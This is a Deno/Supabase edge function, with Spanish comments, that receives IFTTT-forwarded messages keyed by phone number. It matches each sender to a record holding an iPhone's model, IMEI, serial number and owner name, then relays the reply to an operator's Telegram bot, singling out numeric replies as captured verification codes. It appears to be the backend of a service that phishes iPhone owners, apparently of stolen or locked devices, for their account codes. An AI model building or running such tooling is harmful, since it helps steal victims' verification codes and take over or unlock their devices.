

import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

interface NotificationData {
  NotificationTitle?: string;
  NotificationMessage?: string;
  message?: string;
  sender?: string;
  response?: string;
}

serve(async (req) => {
  console.log(`[${new Date().toISOString()}] Received ${req.method} request to telegram-notification`);
  
  if (req.method === 'OPTIONS') {
    console.log('Handling CORS preflight request');
    return new Response(null, { headers: corsHeaders });
  }

  try {
    console.log('Processing notification request...');
    
    let requestData: NotificationData;
    
    try {
      const body = await req.text();
      console.log('Raw request body:', body);
      console.log('Content-Type header:', req.headers.get('content-type'));
      
      if (!body || body.trim() === '') {
        console.log('Empty request body received');
        return new Response(
          JSON.stringify({ 
            success: false, 
            error: 'Empty request body',
            message: 'No se recibió contenido en la solicitud'
          }), 
          { 
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
            status: 400
          }
        );
      }

      // Try to parse as JSON first
      try {
        requestData = JSON.parse(body);
        console.log('Successfully parsed as JSON:', requestData);
      } catch (jsonError) {
        console.log('Failed to parse as JSON, trying to extract phone and message from text...');
        
        // Check if it's the IFTTT format with variables that weren't replaced
        if (body.includes('{{NotificationTitle}}') || body.includes('{{NotificationMessage}}')) {
          console.log('Detected IFTTT template variables that weren\'t replaced');
          return new Response(
            JSON.stringify({ 
              success: false, 
              error: 'IFTTT template error',
              message: 'Las variables de IFTTT no se reemplazaron correctamente. Verifica tu configuración de IFTTT.',
              received_body: body
            }), 
            { 
              headers: { ...corsHeaders, 'Content-Type': 'application/json' },
              status: 400
            }
          );
        }
        
        // Try to extract phone number and message from text format
        // Updated regex to handle international numbers better
        const phoneRegex = /^(\+?\d{1,4}[\s\-]?\d{3,4}[\s\-]?\d{3,4}[\s\-]?\d{0,4})(?:\s+(.*))?$/;
        const match = body.trim().match(phoneRegex);
        
        if (match) {
          const [, phoneNumber, message] = match;
          requestData = {
            NotificationTitle: phoneNumber.trim(),
            NotificationMessage: message || ''
          };
          console.log('Extracted from text format:', requestData);
        } else {
          // If no phone pattern found, try to split by space and take first part as phone
          const parts = body.trim().split(/\s+/);
          if (parts.length >= 2) {
            requestData = {
              NotificationTitle: parts[0],
              NotificationMessage: parts.slice(1).join(' ')
            };
            console.log('Split by space format:', requestData);
          } else {
            // Last resort: treat as message only
            requestData = {
              NotificationTitle: 'Número desconocido',
              NotificationMessage: body.trim()
            };
            console.log('Fallback format:', requestData);
          }
        }
      }
    } catch (parseError) {
      console.error('Error parsing request body:', parseError);
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Invalid request format',
          message: 'Formato de solicitud inválido. Debe ser JSON o texto plano.',
          details: parseError.message
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        }
      );
    }
    
    console.log('Parsed notification data:', requestData);

    // FLUJO CORRECTO según las instrucciones:
    // NotificationTitle = número de teléfono del cliente
    // NotificationMessage = contenido del mensaje (tal como viene)
    
    const phoneNumber = requestData.NotificationTitle || '';
    const messageText = requestData.NotificationMessage || requestData.message || '';
    
    console.log('Phone number (from NotificationTitle):', phoneNumber);
    console.log('Message text (from NotificationMessage):', messageText);
    console.log('Message length:', messageText.length, 'characters');

    // Validar que tenemos un número de teléfono
    if (!phoneNumber || phoneNumber.trim() === '' || phoneNumber === 'Número desconocido') {
      console.log('No valid phone number found in NotificationTitle');
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'No phone number found',
          message: 'No se encontró número de teléfono válido en NotificationTitle',
          received_data: requestData
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        }
      );
    }

    // IMPORTANTE: No filtrar mensajes por longitud - todos los códigos son válidos
    // Ya sea que tengan 1, 2, 3, 4, 5, 6 o más dígitos
    console.log('Processing message regardless of length - all codes are valid');

    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    
    console.log('Connecting to Supabase...');
    const { createClient } = await import('https://esm.sh/@supabase/supabase-js@2');
    const supabase = createClient(supabaseUrl, supabaseKey);

    // Limpiar número de teléfono para búsqueda
    const cleanPhoneNumber = phoneNumber.replace(/[\s\-\(\)\.]/g, '');
    console.log('Searching for process with phone number:', cleanPhoneNumber);

    // Generar patrones de búsqueda más inteligentes para cualquier país
    const generateSearchPatterns = (phone: string) => {
      const patterns = new Set<string>();
      const clean = phone.replace(/[\s\-\(\)\.]/g, '');
      
      // Agregar el número original y limpio
      patterns.add(phone);
      patterns.add(clean);
      
      // Si tiene +, agregar sin +
      if (clean.startsWith('+')) {
        patterns.add(clean.substring(1));
      } else {
        // Si no tiene +, agregar con +
        patterns.add('+' + clean);
      }
      
      // Patrones de longitud variable para números internacionales
      if (clean.length >= 10) {
        // Últimos 10 dígitos (números locales largos)
        patterns.add(clean.slice(-10));
        // Últimos 9 dígitos
        patterns.add(clean.slice(-9));
        // Últimos 8 dígitos
        patterns.add(clean.slice(-8));
        // Últimos 7 dígitos
        patterns.add(clean.slice(-7));
      }
      
      // Para números con códigos de país conocidos, generar variantes
      const countryPatterns = {
        '+1': [10], // USA/Canada - 10 digits
        '+52': [10, 11], // Mexico - 10-11 digits  
        '+54': [10, 11], // Argentina - 10-11 digits
        '+55': [10, 11], // Brazil - 10-11 digits
        '+57': [10], // Colombia - 10 digits
        '+34': [9], // Spain - 9 digits
        '+505': [8], // Nicaragua - 8 digits
        '+506': [8], // Costa Rica - 8 digits
        '+507': [8], // Panama - 8 digits
        '+51': [9], // Peru - 9 digits
        '+56': [9], // Chile - 9 digits
      };
      
      // Detectar código de país y generar patrones específicos
      for (const [countryCode, lengths] of Object.entries(countryPatterns)) {
        if (clean.startsWith(countryCode.replace('+', ''))) {
          const withoutCountry = clean.substring(countryCode.length - 1);
          patterns.add(withoutCountry);
          patterns.add(countryCode + withoutCountry);
          
          // Generar patrones de longitud específica para el país
          for (const len of lengths) {
            if (withoutCountry.length >= len) {
              patterns.add(withoutCountry.slice(-len));
            }
          }
        }
      }
      
      return Array.from(patterns).filter(p => p && p.length > 0);
    };

    const searchPatterns = generateSearchPatterns(cleanPhoneNumber);
    console.log('Generated search patterns:', searchPatterns);

    let matchedProcess = null;
    let matchedPattern = '';

    // Buscar el proceso con patrones mejorados
    for (const pattern of searchPatterns) {
      console.log(`Searching with pattern: "${pattern}"`);
      
      // Buscar en el campo phone_number
      const { data: processes, error: queryError } = await supabase
        .from('processes')
        .select(`
          id,
          user_id,
          client_name,
          iphone_model,
          imei,
          serial_number,
          owner_name,
          country_code,
          phone_number,
          profiles!inner(telegram_bot_token, telegram_chat_id)
        `)
        .eq('phone_number', pattern)
        .not('profiles.telegram_bot_token', 'is', null)
        .not('profiles.telegram_chat_id', 'is', null)
        .limit(1);

      if (queryError) {
        console.error('Database query error for pattern', pattern, ':', queryError);
        continue;
      }

      console.log(`Found ${processes?.length || 0} matching processes for phone_number pattern:`, pattern);

      if (processes && processes.length > 0) {
        matchedProcess = processes[0];
        matchedPattern = pattern;
        console.log('Match found with phone_number pattern:', pattern);
        break;
      }

      // También buscar combinando country_code + phone_number
      console.log(`Searching for pattern "${pattern}" in combined country_code + phone_number`);
      
      const { data: combinedProcesses, error: combinedError } = await supabase
        .from('processes')
        .select(`
          id,
          user_id,
          client_name,
          iphone_model,
          imei,
          serial_number,
          owner_name,
          country_code,
          phone_number,
          profiles!inner(telegram_bot_token, telegram_chat_id)
        `)
        .not('profiles.telegram_bot_token', 'is', null)
        .not('profiles.telegram_chat_id', 'is', null)
        .limit(20);

      if (!combinedError && combinedProcesses) {
        for (const proc of combinedProcesses) {
          const fullNumber = `${proc.country_code}${proc.phone_number}`.replace(/[\s\-\(\)\.]/g, '');
          const fullNumberWithPlus = `+${fullNumber}`;
          
          // Comparaciones más flexibles
          if (fullNumber === pattern || 
              fullNumberWithPlus === pattern ||
              fullNumber === pattern.replace('+', '') ||
              proc.phone_number === pattern ||
              proc.phone_number.replace(/[\s\-\(\)\.]/g, '') === pattern) {
            matchedProcess = proc;
            matchedPattern = pattern;
            console.log('Match found with combined pattern:', pattern, 'matching full number:', fullNumber);
            break;
          }
        }
        
        if (matchedProcess) break;
      }
    }

    if (!matchedProcess) {
      console.log('No matching process found for any pattern');
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Process not found',
          message: `No se encontró un proceso con el número de teléfono: ${cleanPhoneNumber}`,
          phone_searched: cleanPhoneNumber,
          patterns_tried: searchPatterns
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 404
        }
      );
    }

    const process = matchedProcess;
    const profile = process.profiles;

    console.log('Found process:', process.id, 'for user:', process.user_id, 'with pattern:', matchedPattern);

    if (!profile.telegram_bot_token || !profile.telegram_chat_id) {
      console.log('User has not configured Telegram bot');
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Telegram not configured',
          message: 'El usuario no ha configurado su bot de Telegram'
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        }
      );
    }

    // Identificar si es código de verificación basado en contenido
    const isVerificationCode = /^\d{1,8}$/.test(messageText.trim());
    const codeLength = messageText.trim().length;
    
    console.log('Message analysis:', {
      isVerificationCode,
      codeLength,
      messageContent: messageText
    });

    const notificationMessage = `🔔 Alerta de proceso de WhatsApp

👩🏽‍💻 Servidor Astro

📊 INFORMACIÓN DEL PROCESO:
👤 Cliente: ${process.client_name}
📱 Modelo: ${process.iphone_model}
📞 IMEI: ${process.imei}
🔢 Serie: ${process.serial_number}
${process.owner_name ? `👥 Propietario: ${process.owner_name}` : ''}

📞 Remitente: ${phoneNumber}
${isVerificationCode ? 
  `🔐 CÓDIGO DE VERIFICACIÓN: ${messageText.trim()} (${codeLength} dígitos)` : 
  `📥 Respuesta: ${messageText}`
}

🤖 Bot Astro en línea 🟢`;

    console.log('Sending notification to Telegram...');
    console.log('Notification content:', notificationMessage);
    
    const telegramUrl = `https://api.telegram.org/bot${profile.telegram_bot_token}/sendMessage`;
    
    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: profile.telegram_chat_id,
        text: notificationMessage,
        parse_mode: 'HTML'
      }),
    });

    const telegramResult = await telegramResponse.json();
    
    if (!telegramResponse.ok) {
      console.error('Telegram API error:', telegramResult);
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Failed to send Telegram message',
          details: telegramResult
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        }
      );
    }

    console.log('Notification sent successfully to user:', process.user_id);
    console.log('Message type:', isVerificationCode ? `Verification code (${codeLength} digits)` : 'Regular message');

    return new Response(
      JSON.stringify({ 
        success: true, 
        message: 'Notification sent successfully',
        process_id: process.id,
        user_id: process.user_id,
        phone_number: cleanPhoneNumber,
        matched_pattern: matchedPattern,
        message_content: messageText,
        message_type: isVerificationCode ? 'verification_code' : 'regular_message',
        code_length: isVerificationCode ? codeLength : null
      }), 
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200
      }
    );

  } catch (error) {
    console.error('Error processing notification:', error);
    return new Response(
      JSON.stringify({ 
        success: false, 
        error: 'Internal server error',
        details: error.message
      }), 
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500
      }
    );
  }
});

